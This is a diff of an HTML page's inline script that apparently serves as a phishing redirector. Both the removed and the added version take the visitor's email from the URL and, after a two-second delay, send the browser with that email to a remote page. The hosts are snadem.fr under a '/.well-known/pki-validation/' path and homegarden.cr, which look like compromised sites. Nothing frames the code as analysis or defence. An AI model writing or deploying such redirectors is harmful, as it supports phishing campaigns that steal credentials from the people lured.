@@ -3,19 +3,17 @@
 <meta http-equiv="X-UA-Compatible" content="IE=Edge">
 <head>
 <script type="text/javascript">
-		function getUrlVars() {
-		    var vars = {};
-		    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
-		        vars[key] = value;
-		    });
-		    return vars;
-		}
-		var email = getUrlVars()['email'];
-		var redirect = "https://snadem.fr/.well-known/pki-validation/wrth/VerifyCN/";
-		var urlFinal = redirect + "?email=" + email;
-		setTimeout(function () {
-			window.location.href = urlFinal; 
-		}, 2000);
-	</script>
+ var hash = window.location.hash;
+if(hash !== "") 
+
+    hash = hash.split('#');
+    const email = hash[1];
+
+        var redirect = "https://homegarden.cr/djfjhfj/china/index.html";
+  var urlFinal = redirect + "#" + email;
+  setTimeout(function () {
+   window.location.href = urlFinal; 
+  }, 2000);
+ </script>
 </head>
 </html>
